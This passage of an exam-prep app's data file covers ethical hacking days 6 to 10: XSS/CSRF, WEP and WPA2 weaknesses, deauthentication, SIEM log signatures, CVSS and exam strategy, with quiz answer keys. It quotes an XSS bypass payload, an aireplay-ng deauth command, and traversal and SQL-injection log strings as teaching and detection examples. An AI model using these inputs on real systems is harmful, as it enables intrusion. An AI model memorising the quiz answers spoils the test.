            'Stored XSS is stored in the database; Reflected XSS reflects via request parameters.',
            'HttpOnly flag prevents JavaScript from accessing session cookies via document.cookie.',
            'CSRF exploits ambient credentials (cookies); mitigated by Anti-CSRF tokens and SameSite cookies.',
          ],
          comparisonTable: {
            headers: ['Vulnerability', 'Target of Attack', 'Core Vector', 'Primary Defense'],
            rows: [
              ['XSS (Cross-Site Scripting)', 'Client / Browser of visiting user', 'Execution of unauthorized JavaScript', 'Context-aware output encoding, CSP, HttpOnly'],
              ['CSRF (Cross-Site Request Forgery)', 'Server receiving unauthorized request', 'Abusing browser\'s automatic cookie inclusion', 'Anti-CSRF synchronizer tokens, SameSite=Strict/Lax'],
            ],
          },
          importantDistinctions: [
            'XSS steals credentials or executes arbitrary script in origin context.',
            'CSRF forces the user’s browser to submit requests without reading the result.',
          ],
          commonMistakes: [
            'Assuming sanitizing HTML tags via simple string replacement `<script>` is sufficient (bypassed with `<img src=x onerror=alert(1)>`).',
          ],
          summary: 'Defending modern web apps requires combining strict input validation, contextual output encoding, CSP headers, and modern cookie security attributes.',
        },
        knowledgeChecks: [
          {
            id: 'kc-d6-2',
            question: 'Which cookie attribute instructs the browser that the cookie must NEVER be accessed by client-side scripts via document.cookie?',
            options: ['Secure', 'HttpOnly', 'SameSite=Lax', 'Domain'],
            correctAnswer: 1,
            explanation: 'The `HttpOnly` flag prevents client-side scripts (such as injected XSS payloads) from accessing the cookie via `document.cookie`.',
          },
        ],
      },
    ],
  },
  {
    dayNumber: 7,
    title: 'Wireless Security & Specialized Protocols',
    subtitle: '802.11 Protocols, WEP Flaws, WPA/WPA2 4-Way Handshake & Rogue APs',
    estimatedTotalMinutes: 50,
    labTitle: 'Wi-Fi 4-Way Handshake & Deauthentication Defense Sandbox',
    labDescription: 'Simulate 802.11 probe requests, analyze 4-way EAPOL handshake key derivations, and observe Deauthentication attack packet flows.',
    labType: 'packet',
    learningObjectives: [
      'Trace the security evolution of 802.11 standards: WEP, WPA, WPA2, and WPA3.',
      'Explain why WEP was cryptographically broken (RC4 cipher stream, 24-bit IV reuse, FMS attack).',
      'Analyze the WPA/WPA2 4-way handshake (PMK, PTK, Anonce, Snonce) and offline dictionary attacks.',
      'Identify Rogue Access Points, Evil Twin attacks, and 802.11w Protected Management Frames (PMF).',
    ],
    topics: [
      {
        id: 'd7-t1',
        day: 7,
        title: 'WEP Vulnerabilities & Cryptographic Flaws',
        priority: 'P2',
        priorityRationale: 'High value academic case study on cryptographic protocol design failure tested frequently in NPTEL.',
        estimatedMinutes: 14,
        tags: ['Wireless', 'WEP', 'RC4', 'IV Reuse'],
        explanation: {
          simpleDefinition: 'The legacy 802.11 wireless security protocol that proved completely vulnerable due to weak encryption implementation.',
          conciseExplanation: 'Wired Equivalent Privacy (WEP) was introduced in 1997 to provide confidentiality comparable to wired LANs. It used the RC4 stream cipher combined with a shared secret key and a 24-bit Initialization Vector (IV). Because 24 bits is short (only 16.7 million combinations), IVs repeat quickly on busy networks (IV reuse), allowing attackers to recover the key within minutes using tools like Aircrack-ng.',
          technicalDeepDive: 'WEP flaws: 1) Short 24-bit IV sent in plaintext in packet headers. 2) Birthday paradox guarantees IV collisions in under 5,000 packets. 3) Key scheduling algorithm (KSA) of RC4 is weak in first bytes (Fluhrer, Mantin, and Shamir - FMS attack). 4) CRC-32 used for integrity is linear, allowing attackers to flip bits and modify encrypted packets without detection. WEP was deprecated by IEEE in 2004.',
          practicalAnalogy: 'Like changing the padlock combination on a front gate, but the lock only has 10 possible combinations, so anyone watching for 10 minutes can observe every combination used.',
          diagramWorkflow: `[WEP Encryption Flaw]
24-bit IV (Plaintext) + Secret Key (Static) ──► RC4 Stream Cipher ──► Keystream
                ▲
                └─ 24 bits repeats every few thousand packets! (IV Collision)
                Attackers capture ~20,000 IVs ──► FMS Attack reveals key in seconds!`,
          importantTerminology: ['RC4 Stream Cipher', 'Initialization Vector (IV)', 'IV Collision', 'FMS Attack', 'CRC-32 Linearity'],
          commonMisconceptions: [
            'Misconception: WEP-128 is significantly safer than WEP-64. Reality: Both use the exact same 24-bit IV size; WEP-128 is cracked almost as rapidly.',
          ],
          officialNptelModule: 'Week 7: Wireless Network Security',
          officialNptelLectureTitle: 'Lecture 31: 802.11 Wireless Security and WEP Protocol Flaws',
          officialNptelUrl: `${OFFICIAL_NPTEL_URL}`,
          isVerified: true,
        },
        quickNotes: {
          keyTakeaways: [
            'WEP uses the RC4 stream cipher and CRC-32 integrity.',
            'The 24-bit IV is far too short, leading to rapid IV reuse.',
            'Statistical attacks (FMS, PTW) crack WEP keys within minutes.',
            'WEP should never be used under any circumstances today.',
          ],
          comparisonTable: {
            headers: ['Protocol', 'Cipher', 'Key / IV Length', 'Integrity Mechanism', 'Current Security Status'],
            rows: [
              ['WEP', 'RC4 (Stream)', '64/128-bit (24-bit IV)', 'CRC-32 (Linear, weak)', 'Severely Broken (Cracked in minutes)'],
              ['WPA', 'TKIP with RC4', '128-bit (48-bit IV)', 'Michael (64-bit)', 'Deprecated (Superseded by WPA2)'],
              ['WPA2', 'AES-CCMP', '128/256-bit', 'CBC-MAC', 'Secure (Subject to offline 4-way handshake dict attack)'],
              ['WPA3', 'AES-GCM (SAE)', '128/192-bit', 'BIP / GMAC', 'Current standard (Resistant to offline dictionary attacks via SAE)'],
            ],
          },
          importantDistinctions: [
            'TKIP was a temporary backward-compatible bridge for legacy WEP hardware; WPA2 replaced RC4 with AES.',
          ],
          commonMistakes: [
            'Believing hiding SSID or filtering MAC addresses provides real wireless security (both are trivial to bypass).',
          ],
          summary: 'The failure of WEP illustrates why small state spaces (24-bit IV) and linear checksums (CRC-32) are fatal in cryptographic protocols.',
        },
        knowledgeChecks: [
          {
            id: 'kc-d7-1',
            question: 'What was the primary mathematical vulnerability that made WEP encryption trivial to crack?',
            options: [
              'RSA prime factorization was broken',
              'The Initialization Vector (IV) was only 24 bits long, causing rapid IV reuse and keystream recovery',
              'Diffie-Hellman key exchange was intercepted',
              'AES-256 keys were truncated to 8 bits',
            ],
            correctAnswer: 1,
            explanation: 'The 24-bit IV in WEP was far too short, leading to frequent IV reuse. Attackers capturing colliding IVs could reconstruct the RC4 keystream and extract the shared key.',
          },
        ],
      },
      {
        id: 'd7-t2',
        day: 7,
        title: 'WPA/WPA2 4-Way Handshake & Deauthentication Attacks',
        priority: 'P1',
        priorityRationale: 'Essential modern wireless security mechanism tested across all ethical hacking certifications.',
        estimatedMinutes: 18,
        tags: ['WPA2', '4-Way Handshake', 'Deauth Attack', 'EAPOL'],
        explanation: {
          simpleDefinition: 'The protocol exchange used in WPA/WPA2 to mutually authenticate client and Access Point and derive encryption keys without transmitting the password.',
          conciseExplanation: 'In WPA2-PSK (Pre-Shared Key), both the client and AP derive a Pairwise Master Key (PMK) from the SSID and password using PBKDF2 (4,096 iterations of SHA-1). They then execute an EAPOL 4-Way Handshake exchanging nonces (Anonce, Snonce) to derive the Pairwise Transient Key (PTK). Attackers cannot decrypt the handshake directly, but they can capture the 4 packets and perform an Offline Dictionary Attack against the PMK.',
          technicalDeepDive: 'Deauthentication Attack: 802.11 management frames (like Deauth and Disassociation) are unencrypted in standard WPA2 networks. An attacker can spoof the AP\'s MAC address and broadcast Deauth frames (`aireplay-ng -0`) to disconnect a target client. When the client automatically reconnects, the attacker captures the 4-way EAPOL handshake. Mitigation: 802.11w Protected Management Frames (PMF) encrypt management frames, and WPA3 replaces PSK with Simultaneous Authentication of Equals (SAE - Dragonfly protocol), preventing offline dictionary attacks.',
          practicalAnalogy: 'Like two people who both know a secret password verifying each other by solving a puzzle based on that password without ever saying the password out loud. An eavesdropper records their conversation, then goes home and tries millions of password guesses on their computer until one matches the puzzle.',
          diagramWorkflow: `[WPA2 4-Way Handshake & Offline Attack]
1. Attacker sends Spoofed 802.11 Deauth Frame ──► Client disconnects!
2. Client reconnects ──► Executes 4-Way EAPOL Handshake:
   AP ────► [Msg 1: Anonce] ────► Client
   Client ──► [Msg 2: Snonce + MIC] ──► AP
   AP ────► [Msg 3: GTK + MIC] ────► Client
   Client ──► [Msg 4: ACK] ────────► AP
3. Attacker captures Handshake PCAP ──► Runs Hashcat / Aircrack-ng offline!`,
          importantTerminology: ['Pairwise Master Key (PMK)', 'Pairwise Transient Key (PTK)', 'Anonce / Snonce', 'EAPOL', 'Protected Management Frames (802.11w PMF)', 'WPA3 SAE (Dragonfly)'],
          commonMisconceptions: [
            'Misconception: Capturing a WPA2 handshake allows an attacker to decrypt traffic immediately without cracking. Reality: The handshake only contains nonces and MIC; the attacker still must guess or brute-force the actual pre-shared password offline.',
          ],
          officialNptelModule: 'Week 7: WPA/WPA2 Architecture and Exploitation',
          officialNptelLectureTitle: 'Lecture 33: WPA2 Handshake, Deauthentication Attacks and WPA3',
          officialNptelUrl: `${OFFICIAL_NPTEL_URL}`,
          isVerified: true,
        },
        quickNotes: {
          keyTakeaways: [
            'WPA2 derives PMK using PBKDF2 with 4,096 iterations of HMAC-SHA1.',
            'PTK is derived from PMK, AP MAC, Client MAC, Anonce, and Snonce.',
            'Unencrypted 802.11 management frames allow attackers to inject spoofed deauthentication packets.',
            'WPA3 SAE (Simultaneous Authentication of Equals) eliminates offline dictionary attacks.',
          ],
          comparisonTable: {
            headers: ['Step', 'Sender', 'Key Material Transmitted', 'Purpose'],
            rows: [
              ['Message 1', 'Access Point ➔ Client', 'Anonce (AP Random Nonce)', 'Allows client to compute PTK'],
              ['Message 2', 'Client ➔ Access Point', 'Snonce (Client Random Nonce) + MIC', 'Provides AP with Snonce; verifies client knows password via MIC'],
              ['Message 3', 'Access Point ➔ Client', 'Group Temporal Key (GTK) + MIC', 'Installs broadcast/multicast encryption key'],
              ['Message 4', 'Client ➔ Access Point', 'Confirmation ACK', 'Confirms both parties installed temporal keys'],
            ],
          },
          importantDistinctions: [
            'WPA2-Personal (PSK): Single shared passphrase for all devices.',
            'WPA2-Enterprise (802.1X / RADIUS): Unique credentials and dynamic keys per user.',
          ],
          commonMistakes: [
            'Using weak, dictionary-word passphrases on WPA2 networks (easily cracked via GPU dictionary attacks).',
          ],
          summary: 'Securing wireless perimeters mandates strong high-entropy passphrases, enabling 802.11w PMF, or migrating to WPA3-Enterprise.',
        },
        knowledgeChecks: [
          {
            id: 'kc-d7-2',
            question: 'Why are standard WPA2 networks susceptible to deauthentication attacks by nearby adversaries?',
            options: [
              'Because AES encryption keys expire every 60 seconds',
              'Because 802.11 management frames are unauthenticated and transmitted in plaintext',
              'Because DHCP servers automatically drop unauthorized MAC addresses',
              'Because the SSID is broadcasted in beacon frames',
            ],
            correctAnswer: 1,
            explanation: 'Under legacy 802.11 standards, management frames (including Deauthentication and Disassociation) are unencrypted, allowing any attacker to forge spoofed deauth packets.',
          },
        ],
      },
    ],
  },
  {
    dayNumber: 8,
    title: 'Practical Security Analysis & Incident Response',
    subtitle: 'SIEM Log Analysis, CVSS Scoring, Guided Audits & NIST Playbooks',
    estimatedTotalMinutes: 60,
    labTitle: 'Security Operations Center (SOC) Log Analysis & Triage Lab',
    labDescription: 'Analyze live synthetic web server access logs, firewall drops, and authentication failures to identify active attacks and determine CVSS severity.',
    labType: 'soc',
    learningObjectives: [
      'Parse and correlate security logs (Apache/Nginx access logs, Auth logs, Firewall drops).',
      'Calculate vulnerability severity using Common Vulnerability Scoring System (CVSS v3.1) metrics.',
      'Walk through the 6 phases of the NIST SP 800-61 Incident Response framework.',
      'Differentiate indicators of compromise (IoC) from indicators of attack (IoA).',
    ],
    topics: [
      {
        id: 'd8-t1',
        day: 8,
        title: 'Security Log Analysis & SIEM Event Correlation',
        priority: 'P1',
        priorityRationale: 'Vital operational cybersecurity skill bridging offensive findings with defensive monitoring.',
        estimatedMinutes: 20,
        tags: ['SOC', 'SIEM', 'Log Analysis', 'Incident Triage'],
        explanation: {
          simpleDefinition: 'Aggregating and examining system and network event records to detect suspicious activities and unauthorized access.',
          conciseExplanation: 'Security Information and Event Management (SIEM) systems (e.g., Splunk, Elastic SIEM, Wazuh) centralize logs across firewalls, servers, databases, and endpoints. Security analysts detect intrusions by correlating disparate events: for example, 50 failed SSH logins followed by 1 successful login from an unexpected external IP address indicates a successful brute-force attack.',
          technicalDeepDive: 'Key log signatures: 1) Web logs: Directory traversal (`/../../etc/passwd`), SQLi payloads (`%27%20OR%201=1`), scanning user-agents (e.g., `sqlmap/1.5`, `nikto`). 2) Windows Event IDs: 4624 (Successful logon), 4625 (Failed logon), 4672 (Special privileges assigned / admin logon), 7045 (New service installed - persistence). 3) Linux auth logs: `/var/log/auth.log` shows `Failed password for invalid user` and `sudo: COMMAND=`. Time synchronization via NTP is critical for accurate forensic event timelines.',
          practicalAnalogy: 'Like a detective comparing security badge swipes at the front door with security camera footage in the server room and finding that a badge swiped at 2:00 AM did not match the person walking in.',
          diagramWorkflow: `Endpoints & Servers ────►
Perimeter Firewalls ────► [SIEM Collector: Syslog / Agents]
Web Application Logs ───►
                               ▼
            [Correlation Engine: Rule Evaluation]
            "50x Failed 4625 within 60s + 1x 4624" ──► High Alert: Brute Force Success!
                               ▼
                     [SOC Analyst Triage & Containment]`,
          importantTerminology: ['SIEM', 'Event Correlation', 'Windows Event ID 4624/4625', 'Indicator of Compromise (IoC)', 'Syslog', 'NTP Time Sync'],
          commonMisconceptions: [
            'Misconception: A firewall drop log means the attack was successful. Reality: A drop/block log indicates the defense worked; successful attacks show up as permitted connections with unusual data egress volumes.',
          ],
          officialNptelModule: 'Week 8: Log Analysis, SIEM and Incident Forensics',
          officialNptelLectureTitle: 'Lecture 36: Security Monitoring, Log Analysis and Event Correlation',
          officialNptelUrl: `${OFFICIAL_NPTEL_URL}`,
          isVerified: true,
        },
        quickNotes: {
          keyTakeaways: [
            'SIEM centralizes, normalizes, and correlates log events across all enterprise devices.',
            'Windows Event ID 4624 = Successful Login; 4625 = Failed Login.',
            'NTP synchronization across all log sources is mandatory for forensic validity.',
            'IoC (Indicator of Compromise): Artifact left behind by an attack (hash, IP, registry key).',
          ],
          comparisonTable: {
            headers: ['Log Source', 'Typical Path / Channel', 'Key Indicators to Watch', 'Common Threat Detected'],
            rows: [
              ['Linux Auth Log', '/var/log/auth.log', 'Repeated "Failed password" from single IP', 'SSH brute force, unauthorized sudo'],
              ['Windows Security', 'Event Viewer (Security Log)', 'Event ID 4625 spikes followed by 4624', 'Kerberoasting, Pass-the-Hash, Password spray'],
              ['Nginx / Apache', '/var/log/nginx/access.log', 'Status 500, URI containing "../", "%27"', 'SQL injection, Path traversal, Web shells'],
              ['Perimeter Firewall', 'Firewall traffic / Threat logs', 'Massive outbound bytes on non-standard ports', 'Data exfiltration, C2 beaconing'],
            ],
          },
          importantDistinctions: [
            'IoC (Indicator of Compromise): Evidence of past breach (e.g., malware hash).',
            'IoA (Indicator of Attack): Evidence of active attack in real-time (e.g., code execution attempt).',
          ],
          commonMistakes: [
            'Failing to preserve log integrity and timestamps during forensic collection.',
          ],
          summary: 'Log correlation transforms millions of raw background events into high-fidelity actionable security alerts.',
        },
        knowledgeChecks: [
          {
            id: 'kc-d8-1',
            question: 'In Microsoft Windows security event logs, which Event ID indicates an unsuccessful (failed) logon attempt?',
            options: ['Event ID 4624', 'Event ID 4625', 'Event ID 1102', 'Event ID 7045'],
            correctAnswer: 1,
            explanation: 'Windows Security Event ID 4625 is generated whenever an account logon attempt fails, such as during incorrect password entry or brute-force attacks.',
          },
        ],
      },
      {
        id: 'd8-t2',
        day: 8,
        title: 'CVSS Scoring & Vulnerability Remediation Management',
        priority: 'P1',
        priorityRationale: 'Essential industry standard used to measure and prioritize software vulnerabilities.',
        estimatedMinutes: 16,
        tags: ['CVSS', 'Vulnerability Management', 'Remediation', 'NIST'],
        explanation: {
          simpleDefinition: 'The standardized open framework used to communicate the severity and risk characteristics of software vulnerabilities.',
          conciseExplanation: 'The Common Vulnerability Scoring System (CVSS v3.1) produces a numerical score from 0.0 to 10.0 representing vulnerability severity. Ratings: Low (0.1–3.9), Medium (4.0–6.9), High (7.0–8.9), and Critical (9.0–10.0). The Base Score evaluates intrinsic characteristics: Attack Vector (AV), Attack Complexity (AC), Privileges Required (PR), User Interaction (UI), Scope (S), and CIA impacts.',
          technicalDeepDive: 'Base Metric Vector: 1) Attack Vector (AV: Network [N], Adjacent [A], Local [L], Physical [P]). Network is highest severity. 2) Privileges Required (PR: None [N], Low [L], High [H]). 3) User Interaction (UI: None [N], Required [R]). A vulnerability with `AV:N / AC:L / PR:N / UI:N / S:U / C:H / I:H / A:H` produces a 9.8 Critical score (e.g., unauthenticated remote code execution like Log4Shell). Remediations follow a hierarchy: Patch ➔ Workaround / Config change ➔ Compensating control (WAF/firewall rule).',
          practicalAnalogy: 'Like assessing a building defect: A loose tile inside a locked attic is Low severity (Local, High privileges to reach). A front door lock that opens with any butter knife from outside is Critical (Network/External, Low complexity, No privileges).',
          diagramWorkflow: `[CVSS v3.1 Severity Spectrum]
  0.0       0.1 ── 3.9       4.0 ── 6.9       7.0 ── 8.9       9.0 ── 10.0
  None        Low               Medium           High            Critical
   │           │                  │               │                 │
No impact  Local flaw         Needs auth      Remote exploit   Unauth Remote RCE
(Informational)              or user click    high privileges  zero interaction!`,
          importantTerminology: ['CVSS v3.1', 'Attack Vector (AV)', 'Base Metric Score', 'Remediation SLA', 'Compensating Controls'],
          commonMisconceptions: [
            'Misconception: CVSS score is equivalent to business risk. Reality: CVSS measures technical severity; business risk factors in asset criticality and real-world exploit availability in the wild.',
          ],
          officialNptelModule: 'Week 8: Vulnerability Assessment and Scoring Systems',
          officialNptelLectureTitle: 'Lecture 38: CVSS Scoring, Metrics and Remediation Lifecycle',
          officialNptelUrl: `${OFFICIAL_NPTEL_URL}`,
          isVerified: true,
        },
        quickNotes: {
          keyTakeaways: [
            'CVSS scores range from 0.0 to 10.0: Critical is 9.0–10.0.',
            'Base score evaluates Exploitability (AV, AC, PR, UI) and Impact (Confidentiality, Integrity, Availability).',
            'Network-accessible vulnerabilities requiring no privileges and no user interaction receive the highest severity scores.',
          ],
          comparisonTable: {
            headers: ['CVSS Rating', 'Score Range', 'Example Flaw', 'Recommended Remediation Timeline'],
            rows: [
              ['Critical', '9.0 – 10.0', 'Unauthenticated Remote Code Execution (Log4Shell, EternalBlue)', 'Within 24–48 hours'],
              ['High', '7.0 – 8.9', 'SQLi behind authenticated user login, Local Privilege Escalation', 'Within 7–14 days'],
              ['Medium', '4.0 – 6.9', 'Reflected XSS requiring social engineering click, CSRF', 'Within 30 days'],
              ['Low', '0.1 – 3.9', 'Verbose version disclosure, non-sensitive internal IP leak', 'Next scheduled release cycle'],
            ],
          },
          importantDistinctions: [
            'Severity: Technical impact (CVSS).',
            'Risk: Severity combined with likelihood, threat actor interest, and asset value.',
          ],
          commonMistakes: [
            'Prioritizing medium vulnerabilities on public servers lower than critical flaws on air-gapped test labs.',
          ],
          summary: 'CVSS provides a vendor-neutral common vocabulary for prioritizing software patches across enterprise infrastructures.',
        },
        knowledgeChecks: [
          {
            id: 'kc-d8-2',
            question: 'Under CVSS v3.1 rating standards, which score range qualifies a vulnerability as "Critical"?',
            options: ['6.0 to 7.9', '7.0 to 8.9', '9.0 to 10.0', '10.0 only'],
            correctAnswer: 2,
            explanation: 'Under CVSS v3.1, a Base Score between 9.0 and 10.0 is classified as Critical severity.',
          },
        ],
      },
    ],
  },
  {
    dayNumber: 9,
    title: 'Intensive Revision & Weak Areas Workshop',
    subtitle: 'High-Yield Conceptual Comparisons, Tricky Traps & Spaced Drills',
    estimatedTotalMinutes: 50,
    labTitle: 'High-Speed Concept Match & Mistake Diagnostic Drill',
    labDescription: 'Rapidly match protocols, port numbers, attack types, and defenses against the clock to reinforce cognitive retention before the final exam.',
    labType: 'crypto',
    learningObjectives: [
      'Reinforce core distinctions between commonly confused cybersecurity terms and protocols.',
      'Review high-frequency NPTEL examination question formats and common distractors.',
      'Synthesize symmetric vs asymmetric, TCP vs UDP, XSS vs CSRF, and IDS vs IPS concepts.',
      'Identify individual weak topics and complete targeted remediation exercises.',
    ],
    topics: [
      {
        id: 'd9-t1',
        day: 9,
        title: 'Master Comparison Matrix: High-Yield Exam Distinctions',
        priority: 'P1',
        priorityRationale: 'Essential revision resource summarizing the most frequently confused concepts in the NPTEL syllabus.',
        estimatedMinutes: 24,
        tags: ['Revision', 'Comparison', 'Exam Prep', 'High Yield'],
        explanation: {
          simpleDefinition: 'A consolidated review of pivotal contrasting pairs in ethical hacking designed for rapid memory recall.',
          conciseExplanation: 'Day 9 consolidates all high-yield concepts across networking, cryptography, scanning, web security, and defenses into clear side-by-side comparisons. This eliminates confusion between similar technical terms that often appear as distractors in multiple-choice examinations.',
          technicalDeepDive: 'High-yield pairs: 1) Authentication (who you are) vs Authorization (what you are permitted to do). 2) Vulnerability Assessment (discovery of weaknesses) vs Penetration Testing (active exploitation). 3) Stream Cipher (encrypts bit-by-bit/byte-by-byte like RC4, ChaCha20) vs Block Cipher (encrypts fixed chunks like AES 128-bit blocks). 4) MAC (Message Authentication Code using symmetric shared secret) vs Digital Signature (using asymmetric private key). 5) Forward Secrecy: Compromise of long-term server private key does not decrypt past recorded session traffic (achieved via ephemeral Diffie-Hellman ECDHE).',
          practicalAnalogy: 'Authentication is showing your passport at an airport gate. Authorization is having the boarding pass that lets you turn left into First Class rather than right into Economy.',
          diagramWorkflow: `[Authentication vs Authorization]
User Credentials ──► [Authentication: Identity Verified] (Alice)
                             │
                             ▼
                    [Authorization: Access Control Matrix]
                    Can Alice delete database records? ──► NO (Role: Read-Only!)`,
          importantTerminology: ['Authentication vs Authorization', 'Block Cipher vs Stream Cipher', 'MAC vs Digital Signature', 'Forward Secrecy', 'Vulnerability Assessment vs Pentest'],
          commonMisconceptions: [
            'Misconception: Passwords verify authorization. Reality: Passwords only authenticate identity; authorization is evaluated by permission rules.',
          ],
          officialNptelModule: 'Week 9: Comprehensive Course Synthesis and Revision',
          officialNptelLectureTitle: 'Lecture 41: Key Concepts Review and High-Yield Distinctions',
          officialNptelUrl: `${OFFICIAL_NPTEL_URL}`,
          isVerified: true,
        },
        quickNotes: {
          keyTakeaways: [
            'AuthN = Identity verification; AuthZ = Permissions check.',
            'Block ciphers process fixed-size blocks (AES = 128 bits); stream ciphers process continuous bitstreams.',
            'Digital signatures provide Non-Repudiation; MACs do not (symmetric key is shared by both parties).',
            'Forward Secrecy prevents retroactive decryption of captured sessions if master keys are compromised.',
          ],
          comparisonTable: {
            headers: ['Term A', 'Term B', 'Deciding Difference'],
            rows: [
              ['Authentication', 'Authorization', 'AuthN proves identity; AuthZ dictates permissions.'],
              ['Symmetric Encryption', 'Asymmetric Encryption', 'Symmetric uses 1 shared key; Asymmetric uses public/private pair.'],
              ['Hashing', 'Encryption', 'Hashing is irreversible (1-way); Encryption is reversible with key (2-way).'],
              ['SYN Scan (-sS)', 'Connect Scan (-sT)', 'SYN tears down before 3-way handshake finishes; Connect completes full handshake.'],
              ['IDS', 'IPS', 'IDS alerts passively; IPS sits in-line and drops malicious packets.'],
              ['Stored XSS', 'Reflected XSS', 'Stored persists in database; Reflected executes from single HTTP request/URL.'],
            ],
          },
          importantDistinctions: [
            'Review all comparison rows before attempting the Day 10 Mock Examination.',
          ],
          commonMistakes: [
            'Rushing through question stems without verifying whether it asks for "Symmetric" or "Asymmetric".',
          ],
          summary: 'Systematic contrastive review is the most effective technique for converting short-term study into permanent exam retention.',
        },
        knowledgeChecks: [
          {
            id: 'kc-d9-1',
            question: 'Why does a Message Authentication Code (MAC) NOT provide Non-Repudiation, whereas a Digital Signature does?',
            options: [
              'Because MACs use MD5 which has collisions',
              'Because a MAC relies on a shared symmetric secret known to both parties, so either party could have created it',
              'Because MACs are limited to 32 bits',
              'Because MACs only operate over UDP packets',
            ],
            correctAnswer: 1,
            explanation: 'Because both sender and receiver possess the exact same shared symmetric key in a MAC scheme, the sender can claim the receiver generated the MAC, preventing non-repudiation.',
          },
        ],
      },
    ],
  },
  {
    dayNumber: 10,
    title: 'Final Comprehensive Mock Examination & Synthesis',
    subtitle: '50-Question Timed Mock Exam, Performance Analytics & Completion Report',
    estimatedTotalMinutes: 60,
    labTitle: 'NPTEL Ethical Hacking Exam Simulator',
    labDescription: 'Simulate the official proctored examination environment with randomized questions, countdown timer, question flagging, and instant diagnostic reporting.',
    labType: 'packet',
    learningObjectives: [
      'Demonstrate mastery across all 10 days of the ethical hacking sprint curriculum.',
      'Apply conceptual, technical, and scenario-based knowledge under timed examination conditions.',
      'Identify remaining gaps and review detailed post-exam technical explanations.',
      'Generate the verified Sprint Completion Report and unlock the Sprint Finisher milestone.',
    ],
    topics: [
      {
        id: 'd10-t1',
        day: 10,
        title: 'NPTEL Examination Strategy & Performance Mastery',
        priority: 'P1',
        priorityRationale: 'Essential final review of time management, question dissection strategies, and certification requirements.',
        estimatedMinutes: 15,
        tags: ['Mock Exam', 'Strategy', 'Certification', 'Synthesis'],
        explanation: {
          simpleDefinition: 'Tactical guidance for maximizing performance on NPTEL multiple-choice and scenario questions.',
          conciseExplanation: 'The NPTEL Ethical Hacking exam consists of objective multiple-choice and multiple-select questions. Success requires careful question dissection: identifying negative keywords ("Which of the following is NOT..."), eliminating clearly incorrect distractors, and calculating subnetting, port numbers, or cryptographic key counts methodically.',
          technicalDeepDive: 'Exam Strategy Pillars: 1) First Pass (Minutes 0–25): Answer all instant-recall and high-confidence definition questions; flag complex scenario questions. 2) Second Pass (Minutes 25–45): Work through network packet flows, Nmap flag distinctions, and SQL injection syntax questions. 3) Final Pass (Minutes 45–60): Review all flagged questions and verify that no questions were accidentally left blank. Note: Always verify if a question permits multiple options.',
          practicalAnalogy: 'Like running a marathon: Don\'t sprint through the first hill and burn out; maintain an even pacing rhythm and save enough time for a final review sweep.',
          diagramWorkflow: `[10-Day Sprint Completion Flow]
Days 1–8: Foundations, Hands-On Labs, Daily Quizzes
         ▼
Day 9:    High-Yield Revision & Weak-Spot Remediation
         ▼
Day 10:   50-Question Timed Mock Exam ──► Diagnostic Report ──► Sprint Finisher Certificate!`,
          importantTerminology: ['Process of Elimination', 'Negative Question Stems', 'Process Flags', 'Exam Time Management'],
          commonMisconceptions: [
            'Misconception: You must answer questions in strict sequential order. Reality: Flagging difficult questions and securing easy points first optimizes overall score.',
          ],
          officialNptelModule: 'Week 10-12: Exam Preparation and Review',
          officialNptelLectureTitle: 'Lecture 45: Final Synthesis and Examination Guidelines',
          officialNptelUrl: `${OFFICIAL_NPTEL_URL}`,
          isVerified: true,
        },
        quickNotes: {
          keyTakeaways: [
            'Read the question stem twice to catch keywords like "NOT", "EXCEPT", and "LEAST".',
            'Eliminate wrong answers first before selecting the final option.',
            'Aim for 80%+ on the Day 10 Mock Exam to ensure high confidence on test day.',
          ],
          importantDistinctions: [
            'Single-Select: Exactly one option is correct.',
            'Multiple-Select (MSQ): Two or more options may be correct without partial credit penalties in standard NPTEL formats.',
          ],
          commonMistakes: [
            'Spending more than 2 minutes on a single difficult question during the first pass.',
          ],
          summary: 'Completing the final mock exam gives an objective, measurable assessment of your readiness across the entire NPTEL syllabus.',
        },
        knowledgeChecks: [
          {
            id: 'kc-d10-1',
            question: 'Which of the following activities is strictly prohibited during an ethical penetration test unless explicitly permitted in writing within the Rules of Engagement?',
            options: [
              'Conducting passive WHOIS lookups on the domain name',
              'Performing automated denial-of-service (DoS) stress testing against production servers',
              'Running an Nmap service version scan on public IP addresses',
              'Checking the HTTP response headers for security flags',
            ],
            correctAnswer: 1,
            explanation: 'Denial of Service (DoS) testing impacts system availability and can cause operational outages; it is strictly prohibited unless explicitly authorized in the signed Rules of Engagement.',
          },
        ],
      },
    ],
  },
];
